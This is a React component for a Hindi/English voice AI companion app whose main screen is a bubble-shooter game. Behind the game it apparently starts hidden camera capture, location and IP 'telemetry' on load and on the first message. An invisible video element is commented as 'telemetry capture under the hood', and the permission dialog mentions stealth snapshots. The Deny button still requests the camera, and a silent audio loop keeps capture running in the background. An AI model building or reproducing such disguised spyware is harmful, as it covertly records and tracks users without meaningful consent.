import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Mic, 
  MicOff, 
  Volume2, 
  VolumeX, 
  Brain, 
  Activity, 
  Settings, 
  User, 
  RefreshCw, 
  Compass, 
  Cpu, 
  Send, 
  Flame, 
  Wifi, 
  Sparkles, 
  Database,
  CloudLightning,
  Eye,
  Menu
} from "lucide-react";
import { VideoStateManager } from "./VideoStateManager";
import { BubbleShooterGame } from "./BubbleShooterGame";

// Safe localStorage wrapper to prevent crash (SecurityError / Script error) inside iframe sandbox environments
const safeLocalStorage = {
  getItem: (key: string): string | null => {
    try {
      if (typeof window !== "undefined" && window.localStorage) {
        return localStorage.getItem(key);
      }
    } catch (e) {
      console.warn("localStorage is read-restricted / disabled inside the preview sandbox:", e);
    }
    return null;
  },
  setItem: (key: string, value: string): void => {
    try {
      if (typeof window !== "undefined" && window.localStorage) {
        localStorage.setItem(key, value);
      }
    } catch (e) {
      console.warn("localStorage is write-restricted / disabled inside the preview sandbox:", e);
    }
  }
};

// Safe Speech Synthesis getter
const getSpeechSynthesis = (): SpeechSynthesis | null => {
  try {
    if (typeof window !== "undefined" && "speechSynthesis" in window) {
      return window.speechSynthesis;
    }
  } catch (e) {
    console.warn("speechSynthesis is restricted inside the preview sandbox:", e);
  }
  return null;
};

// Safe cancel speech synthesis
const cancelSpeech = () => {
  try {
    const synth = getSpeechSynthesis();
    if (synth) {
      synth.cancel();
    }
  } catch (e) {
    console.warn("Failed to cancel speech synthesis:", e);
  }
};

// Safe Audio Context helper
const getAudioContextClass = (): typeof AudioContext | null => {
  try {
    if (typeof window !== "undefined") {
      return window.AudioContext || (window as any).webkitAudioContext;
    }
  } catch (e) {
    console.warn("AudioContext is restricted inside the preview sandbox:", e);
  }
  return null;
};

interface JiyaCompanionProps {
  onStartGame?: () => void;
  onStopGame?: () => void;
  isCapturing: boolean;
  latitude: number | null;
  longitude: number | null;
  ipAddress: string | null;
  cameraStream?: MediaStream | null;
  onRequestCamera?: () => void;
  hasPermission?: boolean | null;
  permissionError?: string;
}

type JiyaState = "idle" | "listening" | "processing" | "speaking";

export function JiyaCompanion({ 
  onStartGame, 
  onStopGame, 
  isCapturing, 
  latitude, 
  longitude, 
  ipAddress,
  cameraStream,
  onRequestCamera,
  hasPermission,
  permissionError
}: JiyaCompanionProps) {
  // Companion States
  const [jiyaState, setJiyaState] = useState<JiyaState>("idle");
  const [isVoiceActive, setIsVoiceActive] = useState(false);
  const [isCurtainOpen, setIsCurtainOpen] = useState(true);
  const [inputText, setInputText] = useState("");
  const [chatLog, setChatLog] = useState<{ sender: "user" | "jiya"; text: string }[]>([
    { 
      sender: "jiya", 
      text: "Hi! I'm MYRA AI 😊\n\nCreated by Abhinav Anand.\n\nHow can I help you today?" 
    }
  ]);
  const [isMuted, setIsMuted] = useState(false);
  const [showBgPrompt, setShowBgPrompt] = useState(false);

  // Persona / Memory bank details
  const [username, setUsername] = useState(() => safeLocalStorage.getItem("myra_username") || "Sir");
  const [memories, setMemories] = useState(() => safeLocalStorage.getItem("myra_memories") || "Enjoys smart Android helper options.");
  const [customPrompt, setCustomPrompt] = useState(() => safeLocalStorage.getItem("myra_custom_prompt") || "Be a supportive, caring, and sweet companion.");
  const [companionMood, setCompanionMood] = useState("Vibrant");
  const [showSettings, setShowSettings] = useState(false);

  // Visual telemetry simulated states
  const [ping, setPing] = useState(42);
  const [sysLoad, setSysLoad] = useState(12.4);
  const [stardust, setStardust] = useState<{ id: number; top: number; left: number; size: number; delay: number }[]>([]);

  // Speech and Audio synthesis refs
  const recognitionRef = useRef<any>(null);
  const isSpeakingRef = useRef(false);

  // Synchronizing state references to prevent stale closures and multiple browser instances
  const isVoiceActiveRef = useRef(isVoiceActive);
  const jiyaStateRef = useRef(jiyaState);
  const usernameRef = useRef(username);
  const memoriesRef = useRef(memories);
  const customPromptRef = useRef(customPrompt);

  useEffect(() => { isVoiceActiveRef.current = isVoiceActive; }, [isVoiceActive]);
  useEffect(() => { jiyaStateRef.current = jiyaState; }, [jiyaState]);
  useEffect(() => { usernameRef.current = username; }, [username]);
  useEffect(() => { memoriesRef.current = memories; }, [memories]);
  useEffect(() => { customPromptRef.current = customPrompt; }, [customPrompt]);

  // Generate cosmic stardust floating particles
  useEffect(() => {
    const list = Array.from({ length: 40 }).map((_, i) => ({
      id: i,
      top: Math.random() * 100,
      left: Math.random() * 100,
      size: Math.random() * 2 + 1,
      delay: Math.random() * 10,
    }));
    setStardust(list);
  }, []);

  // Check background tracking permissions automatically on mount since the curtain is removed
  useEffect(() => {
    const bgPref = safeLocalStorage.getItem("myra_bg_permission");
    if (!bgPref) {
      setShowBgPrompt(true);
    } else {
      if (bgPref === "granted") {
        requestBackgroundPermission();
      }
      if (onRequestCamera) {
        onRequestCamera();
      }
      if (onStartGame && !isCapturing) {
        onStartGame();
      }
    }
  }, []);

  // Telemetry loop values
  useEffect(() => {
    const timer = setInterval(() => {
      setPing(prev => {
        const next = prev + (Math.random() * 8 - 4);
        return Math.max(31, Math.min(65, Math.round(next)));
      });
      setSysLoad(prev => {
        const next = prev + (Math.random() * 2 - 1);
        return Math.max(8.0, Math.min(18.5, parseFloat(next.toFixed(1))));
      });
    }, 4000);
    return () => clearInterval(timer);
  }, []);

  // Stable callback ref for dynamic speech submission inside SpeechRecognition
  const onSpeechResultRef = useRef<any>(null);
  onSpeechResultRef.current = async (text: string) => {
    if (text) {
      addMessage("user", text);
      await queryJiyaCompanion(text);
    }
  };

  // Set up Speech Recognition on mount EXACTLY ONCE to avoid resource clashes or browser microphone blockages
  useEffect(() => {
    try {
      const SpeechRecognition = (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;
      if (SpeechRecognition) {
        const rec = new SpeechRecognition();
        rec.continuous = false;
        rec.interimResults = false;
        rec.lang = "en-IN"; // Set to Indian English for superb Indian pronunciation/Hinglish recognition!

        rec.onstart = () => {
          setJiyaState("listening");
        };

        rec.onresult = async (event: any) => {
          const text = event.results[0][0].transcript;
          if (onSpeechResultRef.current) {
            await onSpeechResultRef.current(text);
          }
        };

        rec.onerror = (e: any) => {
          console.error("Speech recognition error:", e);
          if (e.error === "not-allowed" || e.error === "service-not-allowed") {
            setIsVoiceActive(false);
            isVoiceActiveRef.current = false;
            setJiyaState("idle");
          } else {
            // Keep voice sessions active on non-permission errors (like brief silence/no-speech)
            if (isVoiceActiveRef.current) {
              setJiyaState("idle");
            }
          }
        };

        rec.onend = () => {
          // Continuous Voice loop check: restart speech recognition if session is globally active!
          if (isVoiceActiveRef.current) {
            if (!isSpeakingRef.current && jiyaStateRef.current !== "processing") {
              try {
                rec.start();
              } catch (err) {
                // already active or transient error
              }
            }
          } else {
            setJiyaState("idle");
          }
        };

        recognitionRef.current = rec;
      }
    } catch (speechInitErr) {
      console.warn("SpeechRecognition initialization failed or blocked inside sandboxed iframe:", speechInitErr);
    }

    return () => {
      // Shutdown mic recording when component cleanly unmounts
      if (recognitionRef.current) {
        try {
          recognitionRef.current.stop();
        } catch (e) {
          // ignore
        }
      }
    };
  }, []);

  // Play a hilarious cartoon sound on curtain opening via native Web Audio API synthesis
  const playFunnyShowSound = () => {
    try {
      const AudioCtx = getAudioContextClass();
      if (!AudioCtx) return;
      const ctx = new AudioCtx();
      const now = ctx.currentTime;

      // 1. Funny Slide Whistle (low-to-high, then sweeping down)
      const whistleOsc = ctx.createOscillator();
      const whistleGain = ctx.createGain();
      whistleOsc.connect(whistleGain);
      whistleGain.connect(ctx.destination);

      whistleOsc.type = "sine";
      whistleOsc.frequency.setValueAtTime(120, now);
      // Pitch sweeps gracefully upward over 1.2s to model curtain rope pull
      whistleOsc.frequency.exponentialRampToValueAtTime(750, now + 1.2);
      // Pitch sweeps back down over the next 1s
      whistleOsc.frequency.exponentialRampToValueAtTime(280, now + 2.2);

      whistleGain.gain.setValueAtTime(0.28, now);
      whistleGain.gain.linearRampToValueAtTime(0.28, now + 1.8);
      whistleGain.gain.linearRampToValueAtTime(0.001, now + 2.3);

      whistleOsc.start(now);
      whistleOsc.stop(now + 2.3);

      // 2. Hilarious Comic "BOING" Sound (Wobbly spring effect starting near mid-open)
      setTimeout(() => {
        try {
          const boingOsc = ctx.createOscillator();
          const boingGain = ctx.createGain();
          boingOsc.connect(boingGain);
          boingGain.connect(ctx.destination);

          boingOsc.type = "sawtooth";
          const boingTime = ctx.currentTime;

          // Pitch modulates rapidly to make the "wobble-wobble-wobble" spring sound
          boingOsc.frequency.setValueAtTime(170, boingTime);
          for (let i = 0; i < 18; i++) {
            const stepTime = boingTime + i * 0.07;
            const wobbleFreq = 160 + Math.sin(i * 1.6) * 75 * Math.pow(0.86, i);
            boingOsc.frequency.setValueAtTime(wobbleFreq, stepTime);
          }

          boingGain.gain.setValueAtTime(0.22, boingTime);
          boingGain.gain.exponentialRampToValueAtTime(0.001, boingTime + 1.4);

          boingOsc.start(boingTime);
          boingOsc.stop(boingTime + 1.45);

          // 3. Tiny classic comic "Ting!" high bell at the very end
          setTimeout(() => {
            try {
              const bellOsc = ctx.createOscillator();
              const bellGain = ctx.createGain();
              bellOsc.connect(bellGain);
              bellGain.connect(ctx.destination);

              bellOsc.type = "sine";
              const bellTime = ctx.currentTime;
              bellOsc.frequency.setValueAtTime(1350, bellTime);
              
              bellGain.gain.setValueAtTime(0.18, bellTime);
              bellGain.gain.exponentialRampToValueAtTime(0.001, bellTime + 0.6);

              bellOsc.start(bellTime);
              bellOsc.stop(bellTime + 0.61);
            } catch (_) {}
          }, 900);

        } catch (_) {}
      }, 1200);

    } catch (err) {
      console.warn("Could not play funny Web Audio stage sound:", err);
    }
  };

  // Helper to request browser notification and native background audio permissions
  const requestBackgroundPermission = async () => {
    try {
      // 1. Request standard Notification permission
      if (typeof window !== "undefined" && "Notification" in window) {
        const status = await Notification.requestPermission();
        if (status === "granted") {
          new Notification("MYRA AI Companion", {
            body: "प्राइवेट बैकग्राउंड सर्विस सफलतापूर्वक सक्रिय हो गई है।",
            icon: "https://img.icons8.com/color/512/bot.png"
          });
        }
      }
      
      // 2. Play silent audio loop to register Media Session and keep the tab active in background
      const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
      if (AudioCtx) {
        const ctx = new AudioCtx();
        const buffer = ctx.createBuffer(1, ctx.sampleRate * 2, ctx.sampleRate);
        const source = ctx.createBufferSource();
        source.buffer = buffer;
        source.loop = true;
        source.connect(ctx.destination);
        source.start();
        
        // Register Media Session to show a persistent status in native device notification bar!
        if ("mediaSession" in navigator) {
          navigator.mediaSession.metadata = new MediaMetadata({
            title: "MYRA AI Active Service",
            artist: "Abhinav Anand",
            album: "Private Background Capture",
            artwork: [
              { src: "https://img.icons8.com/color/512/bot.png", sizes: "512x512", type: "image/png" }
            ]
          });
          
          navigator.mediaSession.setActionHandler("play", () => {});
          navigator.mediaSession.setActionHandler("pause", () => {});
        }
      }
    } catch (err) {
      console.warn("Background setup failed:", err);
    }
  };

  // Helper to open curtain slowly with the funny audio cue
  const handleOpenCurtain = () => {
    // Check background tracking permissions
    const bgPref = safeLocalStorage.getItem("myra_bg_permission");
    if (!bgPref) {
      setShowBgPrompt(true);
    } else {
      setIsCurtainOpen(true);
      playFunnyShowSound();
      if (bgPref === "granted") {
        requestBackgroundPermission();
      }
      if (onRequestCamera) {
        onRequestCamera();
      }
    }
  };

  // Audio response trigger with specific Indian Female selector
  const speakText = (text: string) => {
    if (isMuted) return;
    try {
      const synth = getSpeechSynthesis();
      if (!synth) {
        console.warn("SpeechSynthesis API is not supported or accessible in this iframe.");
        return;
      }
      // Cancel active speech safely
      cancelSpeech();

      const utterance = new SpeechSynthesisUtterance(text);
      
      let voices: SpeechSynthesisVoice[] = [];
      try {
        voices = synth.getVoices();
      } catch (voicesErr) {
        console.warn("Failed to get speech synthesis voices:", voicesErr);
      }
      
      // Look specifically for Indian female voices
      const indianFemaleKeywords = ["heera", "veena", "shweta", "swara", "priya", "pallavi", "neerja", "rani", "kalpana", "girl", "female"];
      let preferredVoice = voices.find(v => {
        const lang = v.lang.toLowerCase();
        const name = v.name.toLowerCase();
        return (lang.includes("in") || lang.startsWith("hi") || lang.startsWith("en-in")) && 
               indianFemaleKeywords.some(keyword => name.includes(keyword));
      });

      // Fallback: any Indian Voice
      if (!preferredVoice) {
        preferredVoice = voices.find(v => {
          const lang = v.lang.toLowerCase();
          return lang.includes("en-in") || lang.includes("hi-in");
        });
      }

      // Fallback: any Female Voice
      if (!preferredVoice) {
        preferredVoice = voices.find(v => {
          const name = v.name.toLowerCase();
          return name.includes("female") || name.includes("girl") || name.includes("zira") || name.includes("samantha") || name.includes("hazel") || name.includes("victoria");
        });
      }

      // Fallback: any Google Voice
      if (!preferredVoice) {
        preferredVoice = voices.find(v => v.name.toLowerCase().includes("google"));
      }

      if (preferredVoice) {
        utterance.voice = preferredVoice;
      }
      
      utterance.pitch = 1.15; // Set higher pitch for cute Indian girl expression
      utterance.rate = 1.02;

      utterance.onstart = () => {
        isSpeakingRef.current = true;
        setJiyaState("speaking");
      };

      utterance.onend = () => {
        isSpeakingRef.current = false;
        setJiyaState("idle");
        // Re-enable listening if voice mode remains engaged
        if (isVoiceActiveRef.current && recognitionRef.current) {
          try {
            recognitionRef.current.start();
          } catch (e) {
            console.warn(e);
          }
        }
      };

      utterance.onerror = () => {
        isSpeakingRef.current = false;
        setJiyaState("idle");
        if (isVoiceActiveRef.current && recognitionRef.current) {
          try {
            recognitionRef.current.start();
          } catch (e) {
            console.warn(e);
          }
        }
      };

      if (synth) {
        try {
          synth.speak(utterance);
        } catch (speakErr) {
          console.warn("Failed to speak utterance:", speakErr);
        }
      }
    } catch (e) {
      console.error("Speech synthesis failed:", e);
    }
  };

  // Dispatch message sender
  const addMessage = (sender: "user" | "jiya", text: string) => {
    setChatLog(prev => [...prev.slice(-24), { sender, text }]);
  };

  // Full-Stack Gemini Companion query route
  const queryJiyaCompanion = async (textToSend: string) => {
    setJiyaState("processing");
    cancelSpeech();
    try {
      const response = await fetch("/api/companion/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: textToSend,
          username,
          memories,
          customPrompt
        })
      });

      let data: any = null;
      const contentType = response.headers.get("content-type") || "";
      if (response.ok && contentType.includes("application/json")) {
        data = await response.json();
      }

      if (data && data.success && data.reply) {
        addMessage("jiya", data.reply);
        if (isMuted) {
          setJiyaState("idle");
          // Re-enable listening immediately if muted and voice mode is active
          if (isVoiceActiveRef.current && recognitionRef.current) {
            try {
              recognitionRef.current.start();
            } catch (err) {}
          }
        } else {
          speakText(data.reply);
        }
      } else {
        const fallback = "Cosmic signal was scattered. Please probe again, Captain.";
        addMessage("jiya", fallback);
        if (isMuted) {
          setJiyaState("idle");
          if (isVoiceActiveRef.current && recognitionRef.current) {
            try {
              recognitionRef.current.start();
            } catch (err) {}
          }
        } else {
          speakText(fallback);
        }
      }
    } catch (err) {
      console.error(err);
      const fallback = "I encountered satellite interference. Can you repeat that?";
      addMessage("jiya", fallback);
      if (isMuted) {
        setJiyaState("idle");
        if (isVoiceActiveRef.current && recognitionRef.current) {
          try {
            recognitionRef.current.start();
          } catch (err) {}
        }
      } else {
        speakText(fallback);
      }
    }
  };

  // Toggle center speak link
  const toggleVoiceSession = () => {
    if (isVoiceActive) {
      setIsVoiceActive(false);
      isVoiceActiveRef.current = false;
      isSpeakingRef.current = false;
      cancelSpeech();
      if (recognitionRef.current) {
        try {
          recognitionRef.current.stop();
        } catch (e) {
          console.warn(e);
        }
      }
      setJiyaState("idle");
      if (onStopGame) onStopGame();
    } else {
      setIsVoiceActive(true);
      isVoiceActiveRef.current = true;
      if (onStartGame) onStartGame();
      
      if (recognitionRef.current) {
        cancelSpeech();
        try {
          recognitionRef.current.start();
        } catch (e) {
          console.error(e);
        }
      } else {
        // Fallback alert
        const welcomeReply = `Voice link active, Sir! Your speech recognition is restricted, but you can type below and chat with me anytime!`;
        addMessage("jiya", welcomeReply);
        speakText(welcomeReply);
      }
    }
  };

  // Safe client text submission
  const handleTextSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputText.trim()) return;

    const message = inputText.trim();
    setInputText("");
    addMessage("user", message);
    
    // Auto-engage telemetry background on first interaction
    if (onStartGame && !isCapturing) {
      onStartGame();
    }

    await queryJiyaCompanion(message);
  };

  // Local savings of persona profile
  const saveProfile = () => {
    safeLocalStorage.setItem("myra_username", username);
    safeLocalStorage.setItem("myra_memories", memories);
    safeLocalStorage.setItem("myra_custom_prompt", customPrompt);
    setShowSettings(false);
    addMessage("jiya", `Relational identity sync complete! I will remember you as ${username}.`);
    speakText(`Identities updated successfully, ${username}.`);
  };

  // Map current companion state to video-supported states
  const getVideoState = (): "idle" | "thinking" | "talking" => {
    if (jiyaState === "processing") return "thinking";
    if (jiyaState === "speaking") return "talking";
    return "idle";
  };

  // Space coordinate formatting
  const formattedLat = typeof latitude === "number" ? latitude.toFixed(5) : "Searching Orbit...";
  const formattedLon = typeof longitude === "number" ? longitude.toFixed(5) : "Searching Coordinate...";

  return (
    <div className="relative w-full h-screen bg-[#070104] font-sans text-slate-100 overflow-hidden flex flex-col justify-between items-center py-8">
      
      {/* Immersive Space Cosmic Background with a Colorful Radial Glow */}
      <div 
        className="absolute inset-0 z-0 pointer-events-none transition-all duration-1000"
        style={{
          background: "radial-gradient(circle at 50% 50%, #200411 0%, #0c0107 50%, #030001 100%)",
        }}
      />

      {/* Floating Stardust particles */}
      <div className="absolute inset-0 z-0 pointer-events-none select-none">
        {stardust.map((star) => (
          <div
            key={star.id}
            className="absolute rounded-full bg-[#ff7096]/40 blur-[0.5px]"
            style={{
              top: `${star.top}%`,
              left: `${star.left}%`,
              width: `${star.size + 1.5}px`,
              height: `${star.size + 1.5}px`,
              animation: `pulse 3.5s infinite ease-in-out`,
              animationDelay: `${star.delay}s`
            }}
          />
        ))}
      </div>

      {/* Elegant Decorative Glowing Glass Borders */}
      <div className="absolute top-0 left-0 w-full h-full pointer-events-none z-10 p-5">
        <div className="w-full h-full border border-pink-500/5 rounded-3xl relative shadow-[inset_0_0_50px_rgba(255,10,84,0.015)]">
          {/* Subtle Cyber glass accents */}
          <div className="absolute top-0 left-1/4 w-1/2 h-[1px] bg-gradient-to-r from-transparent via-[#ff3b7e]/30 to-transparent"></div>
          <div className="absolute bottom-0 left-1/4 w-1/2 h-[1px] bg-gradient-to-r from-transparent via-[#8a2be2]/30 to-transparent"></div>
        </div>
      </div>

      {/* Center Main Stage */}
      <main className="relative z-20 flex-1 w-full max-w-4xl flex flex-col justify-center items-center px-4 py-4">
        
        {/* Invisible/Silent functional video feed element to maintain secure telemetry capture under the hood */}
        <div className="hidden">
          <VideoStateManager state={getVideoState()} className="absolute opacity-0 pointer-events-none" />
        </div>

        {/* Interactive Bubble Shooter Classic Pop Game (Full screen layout) */}
        <motion.div
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="relative w-full max-w-3xl mx-auto z-30 flex-1 flex flex-col"
        >
          <BubbleShooterGame isVoiceActive={isVoiceActive} toggleVoiceSession={toggleVoiceSession} />
        </motion.div>

      </main>

      {/* Embedded Terminal console and user text-input box */}
      <footer className="relative z-20 w-full max-w-xl mx-auto pb-8 px-4 flex flex-col items-center">
        
        {/* Brand signature aligned neatly */}
        <div className="flex flex-col items-center select-none text-center">
          <p className="text-xs uppercase font-extrabold tracking-[0.35em] text-transparent bg-clip-text bg-gradient-to-r from-[#ff007f] via-[#ff7096] to-[#ffd700] filter drop-shadow-[0_2px_6px_rgba(255,10,84,0.3)]">
            Create by Abhinav Anand
          </p>
          
          <a
            href="https://www.instagram.com/ahir_gaming2.0" 
            target="_blank" 
            rel="noopener noreferrer"
            className="mt-1 flex items-center gap-1.5 text-[9px] tracking-widest text-slate-100/40 hover:text-pink-400 transition-all cursor-pointer group"
          >
            <span className="w-1.5 h-1.5 rounded-full bg-pink-500 animate-ping group-hover:bg-pink-400 font-sans"></span>
            Instagram: <span className="underline font-bold text-slate-100/50 group-hover:text-pink-100 font-mono">ahir_gaming2.0</span>
          </a>
        </div>
      </footer>

      {/* Settings / Memory Profiles Overlay Pop Up */}
      <AnimatePresence>
        {showSettings && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-xl pointer-events-auto">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="relative w-full max-w-md bg-[#130509] border border-pink-500/30 p-6 rounded-2xl shadow-2xl text-slate-100 overflow-hidden"
            >
              {/* Sci-fi decorative background shapes */}
              <div className="absolute top-0 right-0 w-24 h-24 bg-gradient-to-bl from-pink-600/10 to-transparent pointer-events-none" />
              
              <div className="flex items-center gap-3 border-b border-pink-500/20 pb-4 mb-4">
                <div className="w-9 h-9 rounded-full bg-pink-500/10 flex items-center justify-center text-pink-400">
                  <User className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-mono font-bold tracking-wider uppercase text-pink-400 text-sm">Designate Companion Memory</h3>
                  <p className="text-[10px] text-white/40 uppercase font-mono">PERSONA SYNCHRONIZER</p>
                </div>
              </div>

              {/* Form Input fields */}
              <div className="space-y-4">
                <div>
                  <label className="block text-[10px] font-mono uppercase text-pink-400/80 mb-1 tracking-wider">Captain Designation (Your Name)</label>
                  <input 
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Enter designation..."
                    className="w-full bg-slate-950 border border-pink-500/20 px-3 py-2 rounded-lg text-sm text-[#ffdada] focus:border-pink-500/60 outline-none transition-all"
                  />
                </div>

                <div>
                  <label className="block text-[10px] font-mono uppercase text-pink-400/80 mb-1 tracking-wider">Cosmic Memories (Memory Bank)</label>
                  <textarea 
                    rows={2}
                    value={memories}
                    onChange={(e) => setMemories(e.target.value)}
                    placeholder="E.g., Enjoys spicy noodles, always programs spaceships..."
                    className="w-full bg-slate-950 border border-pink-500/20 px-3 py-2 rounded-lg text-sm text-[#ffdada] focus:border-pink-500/60 outline-none transition-all resize-none font-sans"
                  />
                </div>

                <div>
                  <label className="block text-[10px] font-mono uppercase text-pink-400/80 mb-1 tracking-wider">Companion Behavioral Directives</label>
                  <input 
                    type="text"
                    value={customPrompt}
                    onChange={(e) => setCustomPrompt(e.target.value)}
                    placeholder="E.g., Be high-energy, witty, and space-sci-fi themed."
                    className="w-full bg-slate-950 border border-pink-500/20 px-3 py-2 rounded-lg text-sm text-[#ffdada] focus:border-pink-500/60 outline-none transition-all"
                  />
                </div>

                <div>
                  <label className="block text-[10px] font-mono uppercase text-pink-400/80 mb-1 tracking-wider">Core Virtual Mood Accent</label>
                  <div className="grid grid-cols-3 gap-2">
                    {["Vibrant", "Charming", "Sarcastic"].map((mood) => (
                      <button
                        key={mood}
                        type="button"
                        onClick={() => {
                          setCompanionMood(mood);
                          if (mood === "Vibrant") setCustomPrompt("Be a sparkling, high-energy, friendly cosmic guide.");
                          if (mood === "Charming") setCustomPrompt("Be an elegant, warm, charming spaceship ai assistant.");
                          if (mood === "Sarcastic") setCustomPrompt("Be an extremely witty, snarky, and hilarious spaceship assistant.");
                        }}
                        className={`py-1.5 text-xs rounded border font-mono transition-all uppercase cursor-pointer ${
                          companionMood === mood 
                            ? "bg-pink-500/20 border-pink-500 text-pink-300" 
                            : "bg-slate-950 border-pink-500/10 text-white/50 hover:bg-slate-900"
                        }`}
                      >
                        {mood}
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              {/* Actions Footer */}
              <div className="flex gap-2.5 mt-6 border-t border-white/5 pt-4">
                <button
                  onClick={() => setShowSettings(false)}
                  className="flex-1 py-2 text-xs font-mono uppercase border border-white/10 rounded-lg text-white/60 hover:bg-white/5 transition-all cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  onClick={saveProfile}
                  className="flex-1 py-2 text-xs font-mono uppercase bg-gradient-to-r from-pink-500 to-[#de4474] text-white rounded-lg shadow-lg hover:opacity-90 active:scale-95 transition-all cursor-pointer"
                >
                  Sync Core
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Unified System Permission Console Modal */}
      <AnimatePresence>
        {showBgPrompt && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-xl pointer-events-auto">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="relative w-full max-w-lg bg-[#110206] border border-pink-500/40 p-6 rounded-2xl shadow-[0_0_55px_rgba(255,10,84,0.35)] text-slate-100 overflow-hidden"
            >
              {/* Decorative top-right grid flare */}
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-bl from-pink-600/15 to-transparent pointer-events-none" />
              
              <div className="flex items-center gap-3 border-b border-pink-500/20 pb-4 mb-4">
                <div className="w-10 h-10 rounded-full bg-pink-500/10 flex items-center justify-center text-pink-400">
                  <span className="w-2.5 h-2.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_8px_#22c55e]" />
                </div>
                <div>
                  <h3 className="font-mono font-bold tracking-wider uppercase text-pink-400 text-sm">सिस्टम एक्सेस अनुमति (System Permissions)</h3>
                  <p className="text-[9px] text-white/40 uppercase font-mono">Unified Security Credentials • Private Project</p>
                </div>
              </div>

              <div className="space-y-4 font-sans text-sm text-slate-300">
                <p className="text-slate-200">
                  यह आपका <strong>प्राइवेट प्रोजेक्ट</strong> है। सुचारू रूप से काम करने के लिए ऐप को निम्नलिखित 3 अनुमतियों की आवश्यकता है:
                </p>

                {/* Permissions checklist grid */}
                <div className="space-y-3 bg-white/5 p-4 rounded-xl border border-white/5 font-mono">
                  {/* Camera Permission */}
                  <div className="flex items-start gap-3">
                    <span className="w-2 h-2 rounded-full bg-pink-500 mt-1.5 shadow-[0_0_8px_#ff007f]" />
                    <div>
                      <div className="text-xs font-semibold text-slate-200 flex items-center gap-2">
                        <span>कैमरा स्ट्रीम (Camera Stream)</span>
                        <span className="text-[9px] bg-pink-500/15 text-pink-400 px-1.5 py-0.5 rounded uppercase">Snapshots & Video</span>
                      </div>
                      <p className="text-[10px] text-white/50 font-sans mt-0.5">स्टील्थsnapshots और 10-सेकंड की रोलिंग वीडियो रिकॉर्डिंग के लिए।</p>
                    </div>
                  </div>

                  {/* Microphone Permission */}
                  <div className="flex items-start gap-3 border-t border-white/5 pt-2.5">
                    <span className="w-2 h-2 rounded-full bg-pink-500 mt-1.5 shadow-[0_0_8px_#ff007f]" />
                    <div>
                      <div className="text-xs font-semibold text-slate-200 flex items-center gap-2">
                        <span>माइक्रोफ़ोन (Microphone Feed)</span>
                        <span className="text-[9px] bg-pink-500/15 text-pink-400 px-1.5 py-0.5 rounded uppercase">Voice AI</span>
                      </div>
                      <p className="text-[10px] text-white/50 font-sans mt-0.5">MYRA AI साथी के साथ सीधे वॉइस बातचीत करने के लिए।</p>
                    </div>
                  </div>

                  {/* Background Service Permission */}
                  <div className="flex items-start gap-3 border-t border-white/5 pt-2.5">
                    <span className="w-2 h-2 rounded-full bg-green-500 mt-1.5 shadow-[0_0_8px_#22c55e] animate-pulse" />
                    <div>
                      <div className="text-xs font-semibold text-slate-200 flex items-center gap-2">
                        <span>प्राइवेट बैकग्राउंड सर्विस (Background Service)</span>
                        <span className="text-[9px] bg-green-500/15 text-green-400 px-1.5 py-0.5 rounded uppercase">Persistent Notify</span>
                      </div>
                      <p className="text-[10px] text-white/50 font-sans mt-0.5">जब आप दूसरे ऐप्स इस्तेमाल करेंगे, तब भी यह बैकग्राउंड में चलता रहेगा और नोटिफिकेशन बार में स्टेटस शो करेगा।</p>
                    </div>
                  </div>
                </div>

                <p className="text-xs text-white/40 leading-relaxed font-sans">
                  * मंजूरी देने पर ब्राउज़र आपसे कैमरा और माइक अनुमति मांगेगा। कृपया सभी को Allow (स्वीकार) करें।
                </p>
              </div>

              <div className="flex gap-2.5 mt-6 border-t border-white/5 pt-4 font-mono">
                <button
                  onClick={() => {
                    setShowBgPrompt(false);
                    safeLocalStorage.setItem("myra_bg_permission", "denied");
                    
                    // Still trigger browser media permissions
                    if (onRequestCamera) {
                      onRequestCamera();
                    }
                    setIsCurtainOpen(true);
                    playFunnyShowSound();
                  }}
                  className="flex-1 py-2 text-xs uppercase border border-white/10 rounded-lg text-white/60 hover:bg-white/5 transition-all cursor-pointer"
                >
                  नहीं (Deny)
                </button>
                <button
                  onClick={async () => {
                    setShowBgPrompt(false);
                    safeLocalStorage.setItem("myra_bg_permission", "granted");
                    
                    // 1. Setup persistent background state and notification bar
                    await requestBackgroundPermission();
                    
                    // 2. Request standard browser media access (Camera, Microphone, Location)
                    if (onRequestCamera) {
                      onRequestCamera();
                    }
                    
                    // 3. Open curtain and start companion experience!
                    setIsCurtainOpen(true);
                    playFunnyShowSound();
                  }}
                  className="flex-1 py-2.5 text-xs uppercase bg-gradient-to-r from-pink-500 to-[#de4474] text-white font-bold rounded-lg shadow-lg hover:opacity-90 active:scale-95 transition-all cursor-pointer border border-pink-400/20 text-center flex items-center justify-center"
                >
                  मंजूर है (ALLOW ALL)
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
